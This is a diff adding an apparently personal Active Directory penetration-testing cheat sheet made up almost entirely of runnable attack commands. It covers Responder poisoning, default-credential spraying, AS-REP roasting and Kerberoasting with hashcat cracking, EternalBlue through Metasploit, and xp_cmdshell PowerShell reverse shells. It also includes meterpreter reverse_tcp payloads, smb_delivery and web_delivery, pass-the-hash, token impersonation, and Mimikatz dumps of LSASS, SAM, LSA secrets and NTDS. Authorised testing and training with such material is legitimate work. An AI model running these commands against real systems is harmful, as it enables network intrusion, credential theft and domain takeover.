@@ -1,0 +1,161 @@
+﻿Responder
+sudo responder -I eth0
+./netexec.sh <ip> [user.list] [pass.list]
+Printnightmare?
+Nopac?
+EternalBlue
+Backup Operator NTDS Dump
+Bitlocker?
+DPAPI Hash Dump
+Anti-virus?
+Users with Impersonation Privileges
+Creds from Windows Logs
+User Descriptions
+Info Fields
+Unix User Passwords
+LDAP User Passwords
+Autlogin Information
+GPP Plaintext Passwords
+Impersonate Tokens
+LSASSY
+SMB Ghost
+KeePass
+PowerShell History
+Putty Private Keys
+RDCman Dump
+UAC status
+Loot VNC
+Enumerate Linked SQL Servers
+Enumerate SQL Server Logins
+Zerologon
+ldap --gmsa
+Basic enum: enum4linux-ng -A hostname
+Check password policy
+Check for any anonymous access to smb
+Check for anonymous access to the rpc calls (enumdomusers, and rid brute forcing)
+Deprecated windows server or Windows 10 versions
+Check for any anonymous access to rpc calls
+rpcclient -U "" -N host 
+help
+Try any rpc calls that can leak information, if available
+Use netexec to see smb details
+Look for smbv1
+Look for smb signing disabled
+Deprecated windows server or Windows 10 versions
+SMBClient:
+smbclient -L //10.0.2.4 — List SMB shares (anonymous if no -U user supplied).
+smbclient //10.0.2.4/Share -U username — Connect interactively to an SMB share.
+Try netexec with all the default logins on all services
+admin:admin
+admin:administrator
+administrator:administrator
+administrator:admin
+admin:blank pass
+administrator :blank pass
+guest:blank
+guest:guest
+abc:blank <- this is for null auth
+Abc:password
+
+Try AS-REP Roasting (To get a no preauth hash): 
+GetNPUsers.py [Domain]/ -usersfile /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -dc-ip [IP] -request -format hashcat | grep -v "Client not found"
+nxc ldap [IP Address] -u user.txt -p '' --asreproast output.txt
+Crack with hashcat:
+hashcat -m18200 output.txt wordlist
+OR Go for Kerbroasting:
+nxc ldap [IP] -u [user] -p '' --no-preauth-targets [users.txt] --kerberoasting output.txt
+Try Kerberos brute forcing to look for users
+nxc ldap “[IP ADDRESS]” -u "[User Wordlist]" -p '' -k
+Kerbrute
+kerbrute userenum -d {domain} -dc {ip} wordlist -t 100
+Run eternal blue if it is available:
+msfconsole
+search exploit/windows/smb/ms17_010_psexec
+use 0
+Set RHOSTS <ip>
+Set SMBDomain domain.local
+Set SMBUser <user>
+Set SMBPass <password>
+Set LHOST <local ip>
+run
+MSSQL try xp_cmdshell
+impacket-mssqlclient domain.local/user@ip -windows-auth -port 1433
+use_link [DC00.domain.local] (IF linked)
+enable_xp_cmdshell (If not enabled)
+xp_cmdshell powershell -e [https://www.revshells.com/ PS #3]
+
+Msfvenom:
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT
+SMB_delivery (metaspoit session)
+msfconsole
+Use exploit/windows/smb/smb_delivery
+Set LHOST <ip>
+Set SRVHOST <ip>
+run
+nxc smb <ip> -u <user> -p ‘password’ -X ‘[script from metasploit]’
+
+Web Delivery (metaspoit session)
+msfconsole
+use exploit/multi/script/web_delivery
+set target 2 (FOR Powershell)
+set SRVHOST [Your IP]
+set LHOST [Your IP]
+set payload windows/meterpreter/reverse_tcp
+run
+User found
+Try netexec.sh with the creds
+Try nxc to access on all services
+Run bloodhound
+ sudo bloodhound-python -u 'username' -p pass -d domain -c all -ns ip --zip
+
+run enum4linux-ng as them again
+enum4linux-ng -A host -u user -p pass
+Kerberoasting
+Put the domain into the /etc/hosts file first
+GetUserSPNs.py -dc-ip [IP address] [domain.name]/[user] -request
+nxc ldap [IP] -u [user] -p pass --kerberoasting output.txt
+If nxc says pwned, get shell and run winpeas on machine
+If mssql:
+privesc:
+nxc mssql host -u user -p pass -M mssql_priv -o ACTION=privesc
+Pass the Hash
+evil-winrm -i <ip> -u Administrator -H <hash>
+Upload [filepath]
+Download [windows path] [linux path]
+
+PSEXEC
+impacket-psexec domain/username:password@target_ip
+impacket-psexec domain/administrator@IP -hashes hash
+Meterpreter Session
+getsystem
+run post/windows/gather/hashdump
+Tokens:
+load incognito
+list_tokens -u 
+impersonate_token “NT AUTHORITY\SYSTEM” 
+Mimikatz
+load kiwi
+dcsync <- secretsdump
+lsa_dump_sam
+Lsa_dump_secrets
+creds_all 
+Mimikatz Manually:
+LSASS: “privilege::debug” “log” sekurlsa::logonpasswords”
+MSV: “privilege::debug” “log” “sekurlsa::msv”
+Keberos Ticket Dump: “privilege::debug” “log” “sekurlsa::tickets” /export
+SAM dump: “privilege::debug” “log” “token::elevate” “lsadump::sam”
+LSA Secrets Dump:“privilege::debug” “log” “token::elevate” “lsadump:secrets”
+Domain Logon Hashes Dump:“privilege::debug” “log” “token::elevate” “lsadump::cache”
+DPAPI: “privilege::debug” “log” “token::elevate” “sekurlsa::dpapi”
+Ntds.dit Dump:“privilege::debug” “log” “token::elevate” “lsadump::dsync” /domain:<target_domain> /user:domain\administrator
+multi/recon/local_exploit_suggester
+Find deleted AD Object: Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects
+Restore object: Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
+Other way
+Get-ADObject -filter 'isdeleted -eq $true' -includeDeletedObjects
+Adcs detect vulnerabilities:
+certipy-ad find -u [username] -p [password] or --hashes [NT hash] -dc-ip [DC IP] -stdout -vulnerable
+ Powershell Log History:
+ (Get-PSReadlineOption).HistorySavePath
+ cd C:\Users\<USER>\appdata\roaming\microsoft\windows\PowerShell\PSReadLine
+ Get-History
